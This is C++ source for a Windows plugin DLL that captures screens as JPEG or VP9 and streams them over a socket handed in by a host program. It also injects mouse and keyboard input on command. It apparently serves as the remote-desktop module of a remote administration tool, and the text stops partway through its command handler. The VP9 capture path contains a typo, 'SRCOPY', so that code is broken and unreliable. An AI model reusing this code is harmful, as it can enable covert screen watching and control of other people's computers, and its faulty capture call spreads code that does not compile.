#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

struct MonitorData {
    RECT rect{};
    string deviceName;
    string displayName;
    bool primary = false;
};

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct MonitorFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_MONITOR_FRAME = 0x03;
static const uint32_t MONITOR_FRAME_FORMAT_JPEG = 1;
static const uint32_t MONITOR_FRAME_FORMAT_VP9 = 4;
static int g_format = MONITOR_FRAME_FORMAT_JPEG;

// --- Minimal libvpx Dynamic Loading Layer ---
typedef void* vpx_codec_iface_t;
typedef void* vpx_codec_iter_t;

typedef enum vpx_img_fmt {
    VPX_IMG_FMT_NONE,
    VPX_IMG_FMT_YV12 = 0x301,
    VPX_IMG_FMT_I420 = 0x102
} vpx_img_fmt_t;

typedef struct vpx_image {
    vpx_img_fmt_t fmt;
    int w;
    int h;
    int d_w;
    int d_h;
    int x_chroma_shift;
    int y_chroma_shift;
    unsigned char *planes[4];
    int stride[4];
    int bps;
    int user_priv;
    unsigned char *img_data;
    int img_data_owner;
    int self_allocd;
    void *fb_priv;
} vpx_image_t;

typedef struct vpx_codec_ctx {
    const char *name;
    vpx_codec_iface_t *iface;
    uint32_t err;
    const char *err_detail;
    uint32_t init_flags;
    union {
        void *priv;
        void *priv_enc;
        void *priv_dec;
    } priv;
} vpx_codec_ctx_t;

typedef struct vpx_codec_enc_cfg {
    unsigned int g_usage;
    unsigned int g_threads;
    unsigned int g_profile;
    unsigned int g_w;
    unsigned int g_h;
    struct {
        unsigned int num;
        unsigned int den;
    } g_timebase;
    unsigned int g_error_resilient;
    unsigned int g_pass;
    unsigned int g_lag_in_frames;
    unsigned int rc_dropframe_thresh;
    unsigned int rc_resize_allowed;
    unsigned int rc_scaled_width;
    unsigned int rc_scaled_height;
    unsigned int rc_resize_up_thresh;
    unsigned int rc_resize_down_thresh;
    unsigned int rc_end_usage;
    unsigned int rc_target_bitrate;
    unsigned int rc_min_quantizer;
    unsigned int rc_max_quantizer;
    unsigned int rc_undershoot_pct;
    unsigned int rc_overshoot_pct;
    unsigned int rc_buf_sz;
    unsigned int rc_buf_initial_sz;
    unsigned int rc_buf_optimal_sz;
    unsigned int rc_2pass_vbr_bias_pct;
    unsigned int rc_2pass_vbr_minsection_pct;
    unsigned int rc_2pass_vbr_maxsection_pct;
    unsigned int kf_mode;
    unsigned int kf_min_dist;
    unsigned int kf_max_dist;
    unsigned int ss_number_layers;
    unsigned int ss_enable_auto_alt_ref[8];
    unsigned int ss_target_bitrate[8];
    unsigned int ts_number_layers;
    unsigned int ts_target_bitrate[16];
    unsigned int ts_rate_decimator[16];
    unsigned int ts_periodicity;
    unsigned int ts_layer_id[16];
    unsigned int layer_target_bitrate[12];
    int temporal_use_sandbox;
    unsigned char reserved[256];
} vpx_codec_enc_cfg_t;

typedef struct vpx_codec_cx_pkt {
    int kind;
    union {
        struct {
            void *buf;
            size_t sz;
            int64_t pts;
            unsigned long duration;
            int flags;
            int partition_id;
        } frame;
    } data;
} vpx_codec_cx_pkt_t;

typedef vpx_codec_iface_t* (*PFN_vpx_codec_vp9_cx)();
typedef int (*PFN_vpx_codec_enc_config_default)(vpx_codec_iface_t* iface, vpx_codec_enc_cfg_t* cfg, unsigned int usage);
typedef int (*PFN_vpx_codec_enc_init_ver)(vpx_codec_ctx_t* ctx, vpx_codec_iface_t* iface, const vpx_codec_enc_cfg_t* cfg, long flags, int ver);
typedef int (*PFN_vpx_codec_encode)(vpx_codec_ctx_t* ctx, const vpx_image_t* img, int64_t pts, unsigned long duration, long flags, unsigned long deadline);
typedef const vpx_codec_cx_pkt_t* (*PFN_vpx_codec_get_cx_data)(vpx_codec_ctx_t* ctx, vpx_codec_iter_t* iter);
typedef int (*PFN_vpx_codec_destroy)(vpx_codec_ctx_t* ctx);
typedef vpx_image_t* (*PFN_vpx_img_alloc)(vpx_image_t* img, vpx_img_fmt_t fmt, unsigned int d_w, unsigned int d_h, unsigned int align);
typedef void (*PFN_vpx_img_free)(vpx_image_t* img);

static HMODULE g_hVpxDll = NULL;
static PFN_vpx_codec_vp9_cx p_vpx_codec_vp9_cx = NULL;
static PFN_vpx_codec_enc_config_default p_vpx_codec_enc_config_default = NULL;
static PFN_vpx_codec_enc_init_ver p_vpx_codec_enc_init_ver = NULL;
static PFN_vpx_codec_encode p_vpx_codec_encode = NULL;
static PFN_vpx_codec_get_cx_data p_vpx_codec_get_cx_data = NULL;
static PFN_vpx_codec_destroy p_vpx_codec_destroy = NULL;
static PFN_vpx_img_alloc p_vpx_img_alloc = NULL;
static PFN_vpx_img_free p_vpx_img_free = NULL;

static bool load_vpx_dll() {
    if (g_hVpxDll) return true;
    const wchar_t* dllNames[] = { L"libvpx.dll", L"vpx.dll", L"libvpx-1.dll" };
    for (const auto& name : dllNames) {
        g_hVpxDll = LoadLibraryW(name);
        if (g_hVpxDll) break;
    }
    if (!g_hVpxDll) return false;

    p_vpx_codec_vp9_cx = (PFN_vpx_codec_vp9_cx)GetProcAddress(g_hVpxDll, "vpx_codec_vp9_cx");
    p_vpx_codec_enc_config_default = (PFN_vpx_codec_enc_config_default)GetProcAddress(g_hVpxDll, "vpx_codec_enc_config_default");
    p_vpx_codec_enc_init_ver = (PFN_vpx_codec_enc_init_ver)GetProcAddress(g_hVpxDll, "vpx_codec_enc_init_ver");
    p_vpx_codec_encode = (PFN_vpx_codec_encode)GetProcAddress(g_hVpxDll, "vpx_codec_encode");
    p_vpx_codec_get_cx_data = (PFN_vpx_codec_get_cx_data)GetProcAddress(g_hVpxDll, "vpx_codec_get_cx_data");
    p_vpx_codec_destroy = (PFN_vpx_codec_destroy)GetProcAddress(g_hVpxDll, "vpx_codec_destroy");
    p_vpx_img_alloc = (PFN_vpx_img_alloc)GetProcAddress(g_hVpxDll, "vpx_img_alloc");
    p_vpx_img_free = (PFN_vpx_img_free)GetProcAddress(g_hVpxDll, "vpx_img_free");

    if (!p_vpx_codec_vp9_cx || !p_vpx_codec_enc_config_default || !p_vpx_codec_enc_init_ver ||
        !p_vpx_codec_encode || !p_vpx_codec_get_cx_data || !p_vpx_codec_destroy ||
        !p_vpx_img_alloc || !p_vpx_img_free) {
        FreeLibrary(g_hVpxDll);
        g_hVpxDll = NULL;
        return false;
    }
    return true;
}

static bool g_vpxInitialized = false;
static vpx_codec_ctx_t g_vpxCtx{};
static vpx_image_t g_vpxImg{};
static int64_t g_vpxPts = 0;
static int g_vpxWidth = 0;
static int g_vpxHeight = 0;

static void cleanup_vpx() {
    if (g_vpxInitialized) {
        if (p_vpx_codec_destroy) {
            p_vpx_codec_destroy(&g_vpxCtx);
        }
        if (p_vpx_img_free) {
            p_vpx_img_free(&g_vpxImg);
        }
        g_vpxInitialized = false;
    }
    g_vpxPts = 0;
    g_vpxWidth = 0;
    g_vpxHeight = 0;
}

static void bgrx_to_i420(const uint8_t* bgrx, int width, int height, uint8_t* dst_y, uint8_t* dst_u, uint8_t* dst_v, int stride_y, int stride_u, int stride_v) {
    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            int src_idx = (y * width + x) * 4;
            uint8_t b = bgrx[src_idx];
            uint8_t g = bgrx[src_idx + 1];
            uint8_t r = bgrx[src_idx + 2];

            int Y = (int)(0.299 * r + 0.587 * g + 0.114 * b);
            dst_y[y * stride_y + x] = (uint8_t)(Y < 0 ? 0 : (Y > 255 ? 255 : Y));

            if ((y % 2 == 0) && (x % 2 == 0)) {
                int r_sum = 0, g_sum = 0, b_sum = 0, count = 0;
                for (int dy = 0; dy < 2; ++dy) {
                    for (int dx = 0; dx < 2; ++dx) {
                        int ny = y + dy;
                        int nx = x + dx;
                        if (ny < height && nx < width) {
                            int idx = (ny * width + nx) * 4;
                            b_sum += bgrx[idx];
                            g_sum += bgrx[idx + 1];
                            r_sum += bgrx[idx + 2];
                            count++;
                        }
                    }
                }
                int avg_b = b_sum / count;
                int avg_g = g_sum / count;
                int avg_r = r_sum / count;

                int U = (int)(-0.169 * avg_r - 0.331 * avg_g + 0.500 * avg_b + 128);
                int V = (int)(0.500 * avg_r - 0.419 * avg_g - 0.081 * avg_b + 128);

                dst_u[(y / 2) * stride_u + (x / 2)] = (uint8_t)(U < 0 ? 0 : (U > 255 ? 255 : U));
                dst_v[(y / 2) * stride_v + (x / 2)] = (uint8_t)(V < 0 ? 0 : (V > 255 ? 255 : V));
            }
        }
    }
}

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_captureSocket = INVALID_SOCKET;
static int g_monitorIndex = 0;
static int g_scalePercent = 50;
static int g_targetFps = 20;
static RECT g_captureRect{};
static bool g_hasCaptureRect = false;

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

static bool safe_send_raw(SOCKET sock, const string& data) {
    const char* ptr = data.c_str();
    int remaining = (int)data.size();

    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0)
            return false;
        ptr += sent;
        remaining -= sent;
    }

    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
    return safe_send_raw(sock, serialized + "\r\n");
}

static bool safe_send_monitor_frame(SOCKET sock,
                                    int monitor,
                                    int scale,
                                    int fps,
                                    int width,
                                    int height,
                                    const vector<unsigned char>& jpegBytes,
                                    int format) {
    if (jpegBytes.empty())
        return false;

    MonitorFrameHeader frameHeader{};
    frameHeader.monitor = (uint32_t)max(0, monitor);
    frameHeader.scale = (uint32_t)max(0, scale);
    frameHeader.fps = (uint32_t)max(0, fps);
    frameHeader.width = (uint32_t)max(0, width);
    frameHeader.height = (uint32_t)max(0, height);
    frameHeader.format = format;
    frameHeader.dataSize = (uint32_t)jpegBytes.size();

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type = PACKET_TYPE_MONITOR_FRAME;
    packetHeader.size = (uint32_t)(sizeof(MonitorFrameHeader) + jpegBytes.size());

    string packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(&packet[0], &packetHeader, sizeof(PacketHeader));
    memcpy(&packet[sizeof(PacketHeader)], &frameHeader, sizeof(MonitorFrameHeader));
    memcpy(&packet[sizeof(PacketHeader) + sizeof(MonitorFrameHeader)], jpegBytes.data(), jpegBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    return safe_send_raw(sock, packet);
}

static void send_monitor_error(SOCKET sock, const string& message) {
    json response;
    response["action"] = "monitorerror";
    response["error"] = message;
    safe_send_json(sock, response);
}

static string wide_to_utf8(const wchar_t* value) {
    if (!value || value[0] == L'\0')
        return "";

    int size = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
    if (size <= 1)
        return "";

    string result(size - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, value, -1, &result[0], size, NULL, NULL);
    return result;
}

static string get_display_name(const char* deviceName) {
    if (!deviceName || deviceName[0] == '\0')
        return "";

    DISPLAY_DEVICEA displayDevice{};
    displayDevice.cb = sizeof(displayDevice);
    if (EnumDisplayDevicesA(deviceName, 0, &displayDevice, 0) && displayDevice.DeviceString[0] != '\0')
        return string(displayDevice.DeviceString);

    return "";
}

static BOOL CALLBACK enum_monitor_proc(HMONITOR monitor, HDC, LPRECT, LPARAM userData) {
    vector<MonitorData>* monitors = reinterpret_cast<vector<MonitorData>*>(userData);

    MONITORINFOEXA info{};
    info.cbSize = sizeof(info);
    if (!GetMonitorInfoA(monitor, &info))
        return TRUE;

    MonitorData item;
    item.rect = info.rcMonitor;
    item.deviceName = info.szDevice;
    item.displayName = get_display_name(info.szDevice);
    item.primary = (info.dwFlags & MONITORINFOF_PRIMARY) != 0;

    if (item.displayName.empty())
        item.displayName = item.deviceName.empty() ? "Monitor" : item.deviceName;

    monitors->push_back(item);
    return TRUE;
}

static vector<MonitorData> enumerate_monitors() {
    vector<MonitorData> monitors;
    EnumDisplayMonitors(NULL, NULL, enum_monitor_proc, reinterpret_cast<LPARAM>(&monitors));

    if (monitors.empty()) {
        MonitorData fallback;
        fallback.rect.left = GetSystemMetrics(SM_XVIRTUALSCREEN);
        fallback.rect.top = GetSystemMetrics(SM_YVIRTUALSCREEN);
        fallback.rect.right = fallback.rect.left + GetSystemMetrics(SM_CXVIRTUALSCREEN);
        fallback.rect.bottom = fallback.rect.top + GetSystemMetrics(SM_CYVIRTUALSCREEN);
        fallback.displayName = "Virtual Screen";
        fallback.primary = true;
        monitors.push_back(fallback);
    }

    return monitors;
}

static void send_monitor_list(SOCKET sock) {
    vector<MonitorData> monitors = enumerate_monitors();
    json response;
    response["action"] = "monitorlistresponse";
    response["monitors"] = json::array();

    for (size_t i = 0; i < monitors.size(); ++i) {
        const MonitorData& monitor = monitors[i];
        int width = monitor.rect.right - monitor.rect.left;
        int height = monitor.rect.bottom - monitor.rect.top;

        string name = monitor.displayName.empty() ? ("Monitor " + to_string(i + 1)) : monitor.displayName;
        if (monitor.primary)
            name += " (Primary)";

        response["monitors"].push_back({
            {"index", (int)i},
            {"name", name},
            {"device", monitor.deviceName},
            {"left", monitor.rect.left},
            {"top", monitor.rect.top},
            {"width", width},
            {"height", height},
            {"primary", monitor.primary}
        });
    }

    safe_send_json(sock, response);
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0)
        return true;

    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0;
    UINT size = 0;

    GetImageEncodersSize(&count, &size);
    if (size == 0)
        return -1;

    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok)
        return -1;

    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }

    return -1;
}

static DWORD now_ms() {
    return GetTickCount();
}

static int clamp_int(int value, int minValue, int maxValue) {
    return max(minValue, min(value, maxValue));
}

static int automatic_fps_for_scale(int scalePercent) {
    if (scalePercent >= 90) return 20;
    if (scalePercent >= 70) return 22;
    if (scalePercent >= 50) return 24;
    return 25;
}

static ULONG automatic_jpeg_quality(int width, int height, int scalePercent) {
    int pixels = max(1, width * height);

    if (scalePercent >= 90 || pixels >= 2500000) return 30;
    if (scalePercent >= 70 || pixels >= 1600000) return 36;
    if (scalePercent >= 50 || pixels >= 900000) return 44;
    return 52;
}

static bool bitmap_to_jpeg(HBITMAP bitmapHandle, ULONG quality, vector<unsigned char>& bytes, string& error) {
    bytes.clear();

    if (!ensure_gdiplus()) {
        error = "GDI+ could not be started";
        return false;
    }

    CLSID jpegClsid;
    if (get_encoder_clsid(L"image/jpeg", &jpegClsid) < 0) {
        error = "JPEG encoder not found";
        return false;
    }

    Bitmap bitmap(bitmapHandle, NULL);
    if (bitmap.GetLastStatus() != Ok) {
        error = "Bitmap conversion failed";
        return false;
    }

    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK || !stream) {
        error = "Memory stream could not be created";
        return false;
    }

    EncoderParameters params{};
    params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value = &quality;

    Status status = bitmap.Save(stream, &jpegClsid, &params);
    if (status != Ok) {
        stream->Release();
        error = "JPEG encoding failed";
        return false;
    }

    STATSTG stat{};
    if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK || stat.cbSize.QuadPart <= 0) {
        stream->Release();
        error = "Encoded image size could not be read";
        return false;
    }

    if (stat.cbSize.QuadPart > 64LL * 1024LL * 1024LL) {
        stream->Release();
        error = "Encoded image is too large";
        return false;
    }

    LARGE_INTEGER seekPos{};
    stream->Seek(seekPos, STREAM_SEEK_SET, NULL);

    bytes.resize((size_t)stat.cbSize.QuadPart);
    ULONG readBytes = 0;
    HRESULT readResult = stream->Read(bytes.data(), (ULONG)bytes.size(), &readBytes);
    stream->Release();

    if (readResult != S_OK || readBytes != bytes.size()) {
        error = "Encoded image could not be read";
        bytes.clear();
        return false;
    }

    return true;
}

static bool capture_monitor_frame(const RECT& rect,
                                  int scalePercent,
                                  vector<unsigned char>& jpegBytes,
                                  int& outputWidth,
                                  int& outputHeight,
                                  string& error) {
    scalePercent = max(10, min(scalePercent, 100));

    int sourceWidth = rect.right - rect.left;
    int sourceHeight = rect.bottom - rect.top;
    if (sourceWidth <= 0 || sourceHeight <= 0) {
        error = "Invalid monitor dimensions";
        return false;
    }

    outputWidth = max(1, (sourceWidth * scalePercent) / 100);
    outputHeight = max(1, (sourceHeight * scalePercent) / 100);
    ULONG jpegQuality = automatic_jpeg_quality(outputWidth, outputHeight, scalePercent);

    HDC screenDC = GetDC(NULL);
    if (!screenDC) {
        error = "Screen device context could not be opened";
        return false;
    }

    HDC memoryDC = CreateCompatibleDC(screenDC);
    if (!memoryDC) {
        ReleaseDC(NULL, screenDC);
        error = "Memory device context could not be created";
        return false;
    }

    HBITMAP bitmap = CreateCompatibleBitmap(screenDC, outputWidth, outputHeight);
    if (!bitmap) {
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "Capture bitmap could not be created";
        return false;
    }

    HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
    SetStretchBltMode(memoryDC, COLORONCOLOR);

    BOOL copied = StretchBlt(
        memoryDC,
        0,
        0,
        outputWidth,
        outputHeight,
        screenDC,
        rect.left,
        rect.top,
        sourceWidth,
        sourceHeight,
        SRCCOPY | CAPTUREBLT
    );

    SelectObject(memoryDC, oldObject);
    DeleteDC(memoryDC);
    ReleaseDC(NULL, screenDC);

    if (!copied) {
        DeleteObject(bitmap);
        error = "Screen capture failed";
        return false;
    }

    bool encoded = bitmap_to_jpeg(bitmap, jpegQuality, jpegBytes, error);
    DeleteObject(bitmap);
    return encoded;
}

static void capture_loop() {
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

    while (g_captureRunning.load()) {
        DWORD frameStart = now_ms();
        SOCKET sock = INVALID_SOCKET;
        int monitor = 0;
        int scale = 50;
        int targetFps = 20;
        RECT captureRect{};
        bool hasCaptureRect = false;
        int currentFormat = MONITOR_FRAME_FORMAT_JPEG;

        {
            lock_guard<mutex> lock(g_captureMutex);
            sock = g_captureSocket;
            monitor = g_monitorIndex;
            scale = g_scalePercent;
            targetFps = g_targetFps;
            captureRect = g_captureRect;
            hasCaptureRect = g_hasCaptureRect;
            currentFormat = g_format;
        }

        if (!hasCaptureRect) {
            send_monitor_error(sock, "Capture monitor is not ready");
            g_captureRunning.store(false);
            break;
        }

        vector<unsigned char> frameBytes;
        int width = 0;
        int height = 0;
        string error;

        if (currentFormat == MONITOR_FRAME_FORMAT_VP9) {
            int sourceWidth = captureRect.right - captureRect.left;
            int sourceHeight = captureRect.bottom - captureRect.top;
            if (sourceWidth <= 0 || sourceHeight <= 0) {
                send_monitor_error(sock, "Invalid monitor dimensions");
                g_captureRunning.store(false);
                break;
            }

            width = max(1, (sourceWidth * scale) / 100);
            height = max(1, (sourceHeight * scale) / 100);

            // Keep dimensions even
            if (width % 2 != 0) width++;
            if (height % 2 != 0) height++;

            HDC screenDC = GetDC(NULL);
            if (!screenDC) {
                send_monitor_error(sock, "Screen DC could not be opened");
                g_captureRunning.store(false);
                break;
            }

            HDC memoryDC = CreateCompatibleDC(screenDC);
            if (!memoryDC) {
                ReleaseDC(NULL, screenDC);
                send_monitor_error(sock, "Memory DC could not be created");
                g_captureRunning.store(false);
                break;
            }

            HBITMAP bitmap = CreateCompatibleBitmap(screenDC, width, height);
            if (!bitmap) {
                DeleteDC(memoryDC);
                ReleaseDC(NULL, screenDC);
                send_monitor_error(sock, "Capture bitmap could not be created");
                g_captureRunning.store(false);
                break;
            }

            HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
            SetStretchBltMode(memoryDC, COLORONCOLOR);

            BOOL copied = StretchBlt(
                memoryDC,
                0,
                0,
                width,
                height,
                screenDC,
                captureRect.left,
                captureRect.top,
                sourceWidth,
                sourceHeight,
                SRCOPY | CAPTUREBLT
            );

            SelectObject(memoryDC, oldObject);

            if (!copied) {
                DeleteObject(bitmap);
                DeleteDC(memoryDC);
                ReleaseDC(NULL, screenDC);
                send_monitor_error(sock, "Screen capture failed");
                g_captureRunning.store(false);
                break;
            }

            BITMAPINFO bmi{};
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
            bmi.bmiHeader.biWidth = width;
            bmi.bmiHeader.biHeight = -height;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 32;
            bmi.bmiHeader.biCompression = BI_RGB;

            vector<uint8_t> bgrx(width * height * 4);
            GetDIBits(screenDC, bitmap, 0, height, bgrx.data(), &bmi, DIB_RGB_COLORS);

            DeleteObject(bitmap);
            DeleteDC(memoryDC);
            ReleaseDC(NULL, screenDC);

            if (!g_vpxInitialized || g_vpxWidth != width || g_vpxHeight != height) {
                cleanup_vpx();

                vpx_codec_enc_cfg_t cfg{};
                int config_res = p_vpx_codec_enc_config_default(p_vpx_codec_vp9_cx(), &cfg, 0);
                if (config_res == 0) {
                    cfg.g_w = width;
                    cfg.g_h = height;
                    cfg.g_timebase.num = 1;
                    cfg.g_timebase.den = clamp_int(targetFps, 1, 100);
                    cfg.g_threads = 4;
                    cfg.rc_end_usage = 0;
                    cfg.g_lag_in_frames = 0;
                    cfg.rc_target_bitrate = 1000;

                    int init_res = -1;
                    for (int ver = 1; ver <= 20; ++ver) {
                        init_res = p_vpx_codec_enc_init_ver(&g_vpxCtx, p_vpx_codec_vp9_cx(), &cfg, 0, ver);
                        if (init_res == 0) {
                            break;
                        }
                    }

                    if (init_res == 0) {
                        p_vpx_img_alloc(&g_vpxImg, VPX_IMG_FMT_I420, width, height, 1);
                        g_vpxWidth = width;
                        g_vpxHeight = height;
                        g_vpxInitialized = true;
                    } else {
                        error = "VP9 encoder initialization failed (code: " + to_string(init_res) + ")";
                    }
                } else {
                    error = "VP9 encoder config default failed (code: " + to_string(config_res) + ")";
                }
            }

            if (g_vpxInitialized) {
                bgrx_to_i420(bgrx.data(), width, height,
                             g_vpxImg.planes[0], g_vpxImg.planes[1], g_vpxImg.planes[2],
                             g_vpxImg.stride[0], g_vpxImg.stride[1], g_vpxImg.stride[2]);

                int flags = 0;
                if (g_vpxPts % 60 == 0) {
                    flags |= 1;
                }

                int encode_res = p_vpx_codec_encode(&g_vpxCtx, &g_vpxImg, g_vpxPts++, 1, flags, 1);
                if (encode_res == 0) {
                    vpx_codec_iter_t iter = NULL;
                    const vpx_codec_cx_pkt_t* pkt;
                    while ((pkt = p_vpx_codec_get_cx_data(&g_vpxCtx, &iter)) != NULL) {
                        if (pkt->kind == 0) {
                            const unsigned char* pkt_buf = (const unsigned char*)pkt->data.frame.buf;
                            frameBytes.insert(frameBytes.end(), pkt_buf, pkt_buf + pkt->data.frame.sz);
                        }
                    }
                } else {
                    error = "VP9 encoding failed (code: " + to_string(encode_res) + ")";
                }
            }

            if (!error.empty()) {
                send_monitor_error(sock, error);
                g_captureRunning.store(false);
                break;
            }
        } else {
            if (!capture_monitor_frame(captureRect, scale, frameBytes, width, height, error)) {
                send_monitor_error(sock, error.empty() ? "Capture failed" : error);
                g_captureRunning.store(false);
                break;
            }
        }

        if (!frameBytes.empty()) {
            if (!safe_send_monitor_frame(sock, monitor, scale, targetFps, width, height, frameBytes, currentFormat)) {
                g_captureRunning.store(false);
                break;
            }
        }

        DWORD elapsed = now_ms() - frameStart;
        DWORD interval = (DWORD)max(1, 1000 / clamp_int(targetFps, 20, 30));
        DWORD waitMs = (elapsed >= interval) ? 1 : (interval - elapsed);

        while (waitMs > 0 && g_captureRunning.load()) {
            DWORD chunk = min<DWORD>(waitMs, 20);
            Sleep(chunk);
            waitMs -= chunk;
        }
    }
}

static void stop_capture_thread() {
    g_captureRunning.store(false);

    if (g_captureThread.joinable()) {
        if (g_captureThread.get_id() == this_thread::get_id())
            g_captureThread.detach();
        else
            g_captureThread.join();
    }

    lock_guard<mutex> lock(g_captureMutex);
    g_hasCaptureRect = false;
    cleanup_vpx();
}

static void start_capture(SOCKET sock, int monitorIndex, int scalePercent, int requestedFps, int format) {
    scalePercent = clamp_int(scalePercent, 10, 100);
    int targetFps = requestedFps > 0
        ? clamp_int(requestedFps, 20, 30)
        : automatic_fps_for_scale(scalePercent);

    vector<MonitorData> monitors = enumerate_monitors();
    if (monitors.empty()) {
        send_monitor_error(sock, "No monitors found");
        return;
    }

    int safeMonitorIndex = clamp_int(monitorIndex, 0, (int)monitors.size() - 1);

    if (format == MONITOR_FRAME_FORMAT_VP9) {
        if (!load_vpx_dll()) {
            send_monitor_error(sock, "VP9 codec (libvpx.dll / vpx.dll) could not be loaded. Please place libvpx.dll in the plugin or client folder.");
            return;
        }
    }

    {
        lock_guard<mutex> lock(g_captureMutex);
        g_captureSocket = sock;
        g_monitorIndex = safeMonitorIndex;
        g_scalePercent = scalePercent;
        g_targetFps = targetFps;
        g_format = format;
        g_captureRect = monitors[(size_t)safeMonitorIndex].rect;
        g_hasCaptureRect = true;
    }

    if (!g_captureRunning.exchange(true)) {
        if (g_captureThread.joinable())
            g_captureThread.join();
        g_captureThread = thread(capture_loop);
    }

    json response;
    response["action"] = "monitorstatus";
    response["status"] = "started";
    response["monitor"] = safeMonitorIndex;
    response["scale"] = scalePercent;
    response["fps"] = targetFps;
    safe_send_json(sock, response);
}

static void simulate_mouse(const string& event, int button, int x, int y) {
    RECT rect{};
    {
        lock_guard<mutex> lock(g_captureMutex);
        if (!g_hasCaptureRect) return;
        rect = g_captureRect;
    }

    // Normalized (0-65535) to Screen Absolute
    // x_abs = rect.left + (x * (rect.right - rect.left) / 65535)
    // SendInput uses MOUSEEVENTF_ABSOLUTE which maps 0-65535 to the virtual screen.

    int screen_x = rect.left + MulDiv(x, rect.right - rect.left, 65535);
    int screen_y = rect.top + MulDiv(y, rect.bottom - rect.top, 65535);

    // Map screen coordinate to MOUSEEVENTF_ABSOLUTE (0-65535 of virtual screen)
    int v_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int v_top = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int v_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int v_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (v_width <= 0 || v_height <= 0) return;

    double fx = (double)(screen_x - v_left) * (65535.0 / (double)(v_width - 1));
    double fy = (double)(screen_y - v_top) * (65535.0 / (double)(v_height - 1));

    INPUT input = {0};
    input.type = INPUT_MOUSE;
    input.mi.dx = (LONG)fx;
    input.mi.dy = (LONG)fy;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

    if (event == "move") {
        input.mi.dwFlags |= MOUSEEVENTF_MOVE;
    } else if (event == "down") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN;
    } else if (event == "up") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP;
    }

    SendInput(1, &input, sizeof(INPUT));
}

static void simulate_key(const string& event, int vk) {
    INPUT input = {0};
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)vk;
    if (event == "up") {
        input.ki.dwFlags = KEYEVENTF_KEYUP;
    }
    SendInput(1, &input, sizeof(INPUT));
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_monitor_list(sock);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "monitorlist") {
            send_monitor_list(sock);
            return;
        }

        if (action == "monitorstart") {
            int monitor = command.value("monitor", 0);
            int scale = command.value("scale", 50);
            int fps = command.value("fps", 0);
            string formatStr = command.value("format", "JPEG");
            int format = MONITOR_FRAME_FORMAT_JPEG;
            if (formatStr == "VP9") {
                format = MONITOR_FRAME_FORMAT_VP9;
            }
            start_capture(sock, monitor, scale, fps, format);
